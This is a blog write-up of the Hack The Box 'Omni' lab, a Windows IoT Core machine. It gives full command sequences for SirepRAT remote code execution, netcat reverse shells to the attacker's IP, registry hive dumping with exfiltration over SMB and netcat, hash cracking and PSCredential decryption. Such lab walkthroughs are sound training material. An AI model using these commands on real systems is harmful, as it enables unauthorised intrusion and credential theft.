---
layout: post
title:  "Omni Writeup - Hack The Box"
date:   2025-10-07
desc: ""
keywords: "HTB,OSCP,Windows,Windows IoT Core,SirepRAT,Powershell Credentials,Secretsdump,Hashcat,Cracking,Easy"
categories: [HTB]
tags: [HTB,OSCP,Windows,Windows IoT Core,SirepRAT,Powershell Credentials,Secretsdump,Hashcat,Cracking,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/omni_writeup/Omni.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

After a brief pause with **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** **Windows** machines, it's time to continue with **Omni**, which the community has rated as **Easy**, but I strongly disagree with this valuation because I had a very hard time engaging with it. I know that the complexity of the exploitation is not very high, but since there are **several concepts involved**, it really took me a long time to find and understand the correct way to exploit the attack vectors. Whenever I face a **Windows** machine lab, I encounter many obstacles, but the concepts I learn and the fun I have are the great rewards I take away from these excellent **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines. It's time to sign in to my account and spawn the lab to start the writeup that helps me finish assimilating all the information accumulated with each completed engagement.

<br /><br />
<img src="{{ site.img_path }}/omni_writeup/Omni_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start the **Reconnaissance** phase again, following my methodology, which I refine with each lab I do, but first I check if I can already interact with the machine through the **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** VPN. To do this, I use `ping`, and after several failed attempts, I manage to send a trace. The next thing I do is verify the box's **OS** with the `whichSystem.py` tool, developed by **[hack4u's](https://hack4u.io/){:target="_blank"}**, which takes into account the **TTL** value to deduce it (although I still have connection problems on this machine). I can now list the open ports with `nmap` and leak information about the services available on each of them, taking advantage of the scripts of this beautiful tool. I find a lot of interesting information, but before continuing and taking into account the problems I had with `ping` and `whichSystem.py`, I take the opportunity to use other tools such as **[`fastTCPScan`](https://s4vitar.github.io/fasttcpscan-go/#){:target="_blank"}** and **[TCPing](https://github.com/AyoobAli/TCPing){:target="_blank"}** to perform port enumeration.

> **[TCPing](https://github.com/AyoobAli/TCPing){:target="_blank"}** is a tool that allows you to use a **TCP** connection to ping a service. It can be used as a replacement of **ICMP Ping** in case the network doesn't allow **ICMP**, or as a service live check.

```bash
ping -c 2 10.10.10.204
whichSystem.py 10.10.10.204

sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.204 -oG allPorts
nmap -sCV -p135,5985,8080,29819 10.10.10.204 -oN targeted
nmap -sCV -p135,5985,8080,29819 10.10.10.204 -oN targeted -Pn
# Basic realm=Windows Device Portal

fastTCPScan -host 10.10.10.204 -threads 500

git clone https://github.com/AyoobAli/TCPing
python3 tcping.py -i 10.10.10.204 -n 2
python3 tcping.py -i 10.10.10.204 -n 2 -p 8080
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After an unsuccessful attempt to connect with `rpcclient`, taking advantage of the fact that the **RCP** protocol (**port 135**) is enabled, I focus my attention on the **HTTP** protocol (**port 8080**), which always represents the largest attack surface in most of the labs I have conducted. Using `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, I disclose the technologie stack behind the web application. I find the name of the portal to be the most interesting piece of information, but when I try to access it from the browser, I'm faced with an authentication panel that is very unlikely to be bypassed. I do a quick search of the **Windows Device Portal** (**WDP**) web server for any available exploits with `searchsploit`, but I'm unsuccessful - No default credentials either. I also find no further information by performing **banner grabbing** with `curl` and `nc`. The next thing I do is search the **Internet** for an exploit for this server, and now I manage to find a repository for the **[SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT){:target="_blank"}** tool that would allow me to execute commands remotely (**RCE**) on **Windows IoT Core**. After finding the correct version of `python` to run the exploit, as well as creating an environment and installing the necessary libraries, I get the program to work correctly.

> The **Windows Device Portal** (**WDP**) is a **web server** included with Windows devices that lets you configure and manage the settings for the **device over a network** or **USB** connection (local connections are also supported on devices with a web browser). **WDP** also provides advanced diagnostic tools for troubleshooting and viewing the real-time performance of your Windows device.

> **[SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT){:target="_blank"}** (**RCE** as SYSTEM on Windows IoT Core): The method is exploiting the **Sirep Test Service** that’s built in and running on the official images offered at **Microsoft’s site**. This service is the **client part** of the **HLK** setup one may build in order to perform **driver/hardware** tests on the **IoT device**. It serves the **Sirep/WPCon/TShell** protocol.

> **[SirepRAT](https://www.bitdefender.com/en-us/blog/hotforsecurity/remote-access-tool-enables-code-execution-windows-iot-core-devices){:target="_blank"}**: Remote Access Tool Enables **Code Execution on Windows IoT Core Devices**. A new tool released to the public allows remote attackers to run commands on gadgets using **Windows 10 IoT Core** and gain control over them. The utility takes advantage of an **unprotected interface** with **remote administration capabilities**, which serves for testing drivers and hardware on IoT devices.

> **Windows IoT**, short for **Windows Internet of Things** and formerly known as **Windows Embedded**, is a family of operating systems from **Microsoft** designed for use in embedded systems.

```bash
rpcclient -U "" 10.10.10.204 -N
whatweb http://10.10.10.204:8080
# http://10.10.10.204:8080/

rpcclient -U "" 10.10.10.204 -N
whatweb http://10.10.10.204:8080
# http://10.10.10.204:8080

curl -s -X GET http://10.10.10.204:8080 -I
nc -nv 10.10.10.204 8080

searchsploit windows device portal
searchsploit windows device

git clone https://github.com/SafeBreach-Labs/SirepRAT
pip install -r requirements.txt
python2 SirepRAT.py --help
python2 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path C:\Windows\System32\Drivers\etc\hosts

python3 SirepRAT.py --help
pip3 install hexdump

python3 -m venv .
./bin/pip3 install hexdump
./bin/python3 SirepRAT.py --help
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I already have the tool, so the next step is to understand how it works through **trial-and-error technique** until I get a partial result that makes me think I can now leak sensitive information from the system. After **increasing the verbosity** level, I can see the full content of some **Windows** configuration files, but I can also improve the visibility of my command output using features of the **[SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT){:target="_blank"}** exploit. I try to inject commands, but my privileges seem to be very low, so I'm allowed to perform certain actions and not others. I manage to enumerate the file system and find out the values of the **environment variables**, which can be very helpful in understanding the characteristics of the system.

```bash
./bin/python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path C:\Windows\System32\Drivers\etc\hosts

./bin/python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\Drivers\etc\hosts"
./bin/python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\Drivers\etc\hosts" --vv

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c whoami"

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args " /c whoami"
./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args " /c whoami" --vv

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args " /c whoami" --vv --return_output

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -c 'whoami'" --vv --return_output
./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args " /c echo %USERNAME%" --vv --return_output
./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c dir C:\' --vv --return_output
./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c dir C:\Users' --vv --return_output
./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c echo %PROCESSOR_ARCHITECTURE%' --vv --return_output
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Accessing the system now seems closer, so I think the most direct attack vector is to upload the `nc.exe` tool to the victim machine by injecting a command with the exploit and using the `iwr` binary (the **[LOLBAS](https://lolbas-project.github.io/){:target="_blank"}** website has a complete list of tools that can be used). After correcting my malicious command, I managed to transfer the file, but unfortunately there was a compatibility issue that I quickly solved by using the `nc64.exe` binary from **[eternallybored](https://eternallybored.org/misc/netcat/){:target="_blank"}**. Finally, after deleting the first `nc.exe` and uploading the correct one, I was able to catch the incoming **Reverse shell** on port **443**, which I had opened earlier with `nc`. Now it's time to enumerate the system and look for the attack vector to **Escalate privileges**.

> **Attacker Machine**:

```bash
locate nc.exe | grep -v al3j0
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c iwr.exe -uri http://10.10.14.13/nc.exe -OutFile C:\\Windows\Temp\nc.exe' --vv --return_output

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c powershell.exe -c iwr -uri http://10.10.14.13/nc.exe -OutFile C:\\Windows\Temp\nc.exe' --vv --return_output

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c dir C:\Windows\Temp' --vv --return_output

rlwrap -cAr nc -nlvp 443

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c C:\Windows\Temp\nc.exe -e cmd 10.10.14.13 443' --vv --return_output

mv ~/Downloads/netcat-win32-1.12.zip ./netcat.zip
unzip netcat.zip
mv nc64.exe nc.exe

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c del C:\Windows\Temp\nc.exe'
./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c dir C:\Windows\Temp\' --vv --return_output

python3 -m http.server 80
rlwrap -cAr nc -nlvp 443

./bin/python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args ' /c powershell.exe -c iwr -uri http://10.10.14.13/nc.exe -OutFile C:\\Windows\Temp\nc.exe' --vv --return_output
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After trying hard to list the system, I begin to find very varied and interesting information, such as an additional volume that may be a locally mounted file system, and **.txt** and **.xml** files that appear to be related to the **WDP** web server. Unfortunately, I cannot access the content of any of the files I found, nor that of the first flag, as the **[.NET PSCredential class](https://learn.microsoft.com/es-es/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.4.0){:target="_blank"}** is being used to protect the content (using **Secure String**). I try to **[obtain the content in plain text](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html){:target="_blank"}**, but I do not have the necessary module to do so, so I must look for another attack vector.

> **[PSCredential](https://learn.microsoft.com/es-es/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.4.0){:target="_blank"}** is a **PowerShell object** that stores a username and a secure password. It is commonly used in **system management automation** to securely pass credentials to commands and scripts.

```bash
cd C:\
dir /a
# Data ?

dir /S user.txt

type hardening.txt
type iot-admin.xml
type user.txt

powershell
$flag = "01...e7" | ConvertTo-SecureString
# :(
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before resorting to tools that automate the search for possible attack vectors, I use a technique to **[steal Windows credentials](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html#stealing-windows-credentials){:target="_blank"}** that consists of dumping copies of the **SAM** and **SYSTEM** files from the **registry**, since the originals are protected. After starting an **SMB** server with `impacket-smbserver`, I manage to transfer the copies of the files, but I'm unable to dump the account password hashes with `impacket-secretsdump` or `secretsdump.py`. Something about the size of the files bothers me; I fear that their integrity may have been compromised during the transfer.

> **[Stealing SAM & SYSTEM](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html#stealing-windows-credentials){:target="_blank"}**: This files should be located in **"C:\windows\system32\config\SAM"** and **"C:\windows\system32\config\SYSTEM"**. But you cannot just copy them in a regular way because they protected.

> **Victime Machine**:

```cmd
reg save HKLM\sam sam.bck
reg save HKLM\system system.bck
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy .\sam.bck x:\sam
copy .\system.bck x:\system
```

> **Attacker Machine**:

```bash
impacket-secretsdump -sam sam -system system LOCAL
secretsdump.py -sam sam -system system LOCAL
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to try everything again, starting with copying the registry files, but this time I'm going to start the **SMB server** with `impacket-smbserver` password protected. Before continuing, I delete the previously transferred files, as well as the volume generated by **Windows** when using the **SMB server** on my attacking machine. Unfortunately, I run into problems again, but now I understand why: the **size of the SYSTEM file** is the issue, so the quickest solution I can find is to **[use `nc.exe` to perform the transfer](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/){:target="_blank"}**. After checking the integrity of the files, I use `impacket-secretsdump` to dump the hashes, and even with `secretsdump.py` I succeed in my goal, and I can now crack the hashes on **[Crackstation](https://crackstation.net/){:target="_blank"}** site to obtain a **one** plaintext password.

> **Victime Machine**:

```cmd
reg save HKLM\sam sam.bck
reg save HKLM\system system.bck
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFold $(pwd) -smb2support -username oldboy -password oldb0y123#!
```

> **Victime Machine**:

```cmd
net use z: \\10.10.14.13\smbFold /u:oldboy oldb0y123#!
net use
net use \\10.10.14.13\smbFolder /delete
net use * /delete /y
net use

net use x: \\10.10.14.13\smbFold /u:oldboy oldb0y123#!
dir x:\
copy .\sam.bck x:\sam
copy .\system.bck x:\system

exit
```

> **Attacker Machine**:

```bash
nc -nlvp 443 > system
```

> **Victime Machine**:

```cmd
.\nc.exe 10.10.14.13 443 < .\privesc\system.bck
```

> **Attacker Machine**:

```bash
du -hc -b system

impacket-secretsdump -sam sam -system system LOCAL
secretsdump.py -sam sam -system system LOCAL
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The name of the cracked hash account is **app**, which makes me think that it might be useful for logging into the **WDP web server**, and indeed I manage to access the dashboard. There are some features of the server that really catch my attention, such as **remote connection** and **file uploading**, but the most striking is the **execution of commands** through a **"pseudo terminal"**. After some testing, I can now try to access the system with a new compromised account (**app**). What I do is transfer `nc.exe` to a directory where I have write permissions and then catch the incoming **Reverse shell** with `nc` on port **443** of my attacking machine. This way, I'm able to access the target system again.

```bash
# http://10.10.10.204:8080/
# http://10.10.10.204:8080/#Device Settings
# Remote: ...install the remote client app

# http://10.10.10.204:8080/#Run command
# whoami
# echo %USERNAME%                         app!

python3 -m http.server 80
# powershell.exe -c iwr -uri http://10.10.14.13/nc.exe -OutFile C:\Windows\Temp\nc.exe      :(
# powershell.exe -c iwr -uri http://10.10.14.13/nc.exe -OutFile C:\Data\Users\nc.exe        :)

rlwrap -cAr nc -nlvp 443

# http://10.10.10.204:8080/#Run command
# C:\Data\Users\app\nc.exe -e cmd 10.10.14.13 443
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the new compromised account, I will attempt to obtain the content of the first **flag** in plain text. To do this, I will migrate to a `powershell` shell and follow all the necessary steps. This time, I'm more lucky and achieve my goal. The next thing I do is also access the protected content of the **iot-admin.xml** file, which appears to be related to the web server.

```cmd
type user.txt

powershell

$flag = "01...e7" | ConvertTo-SecureString
$user = "app"
$flag_value = New-Object System.Management.Automation.PSCredential($user,$flag)
$flag_value.GetNetworkCredential() | fl

type iot-admin.xml
$pass = "010...c27" | ConvertTo-SecureString
$user = "Administrator"
$cred = New-Object System.Management.Automation.PSCredential($user,$pass)
$cred.GetNetworkCredential() | fl
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I access the web server again from my browser, but this time with the **Administrator** credentials I just discovered. To **Escalate privileges**, I already know exactly what to do: I transfer `nc.exe` again, but this time to the Administrator user's home directory, and I catch the incoming **Reverse shell** again with `nc` on port **443** of my attacking machine. As expected, the content of the last flag is also protected, so I take the necessary steps to obtain its content in plain text and complete the **engagement** of this beautiful **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** box.

> **Attacker Machine**:

```bash
# http://10.10.10.204:8080
# Processes --> Run command
# echo %USERNAME%                 :)

python3 -m http.server 80
# powershell.exe -c iwr -uri http://10.10.14.13/nc.exe -OutFile C:\Data\Users\Administrator\nc.exe
# dir C:\Data\Users\Administrator

rlwrap -cAr nc -nlvp 443
# C:\Data\Users\Administrator\nc.exe -e cmd 10.10.14.13 443
```

> **Victime Machine**:

```cmd
echo %USERNAME%

type root.txt
powershell
$flag = "010...1a7" | ConvertTo-SecureString
$user = "Administrator"
$value = New-Object System.Management.Automation.PSCredential($user,$flag)
$value.GetNetworkCredential() | fl
```

<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/omni_writeup/Omni_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> With each new **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab, I discover how much I can continue to learn about the world of **Information Security**, as it is so vast and impossible to cover so much knowledge. I'm going to continue practicing on this excellent platform and then choose which field I want to work in, thus avoiding the frustration of wanting to know too much, which can have the opposite effect to what I'm aiming for. I kill the **Omni** box to choose my new target.

<br /><br />
<img src="{{ site.img_path }}/omni_writeup/Omni_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
